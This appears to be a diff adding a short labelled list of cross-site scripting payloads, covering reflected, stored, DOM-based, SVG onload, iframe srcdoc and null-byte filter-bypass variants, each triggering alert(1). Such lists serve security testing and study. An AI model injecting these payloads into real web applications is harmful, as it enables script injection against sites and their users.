@@ -1,0 +1,6 @@
+[Reflected] <script>alert(1)</script>
+[Stored] <img src=x onerror=alert(1)>
+[DOM-Based] javascript:alert(1)
+[SVG Bypass] <svg/onload=alert(1)>
+[Srcdoc] <iframe srcdoc="<script>alert(1)</script>"></iframe>
+[Null Byte] <script%00>alert(1)</script>
